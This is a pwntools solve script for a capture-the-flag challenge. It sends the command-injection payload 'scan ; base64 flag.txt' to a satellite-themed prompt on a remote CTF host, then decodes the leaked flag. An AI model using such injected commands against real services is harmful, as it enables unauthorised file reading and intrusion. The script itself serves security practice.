from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./challenge"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("kubenode.mctf.io", 31008)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


payload = b"scan ; base64 flag.txt"
io.sendlineafter("SATCOM> ", payload)
if f_remote:
    io.recvuntil("telemetry\n")
    data = io.recvline() + io.recvline()
    data = data.replace(b"\n",b"")
else:
    io.recvuntil(" No such file or directory\n")
    data = io.recvline()

log.success(data)
flag = base64.b64decode(data)
log.success(flag)


io.interactive()
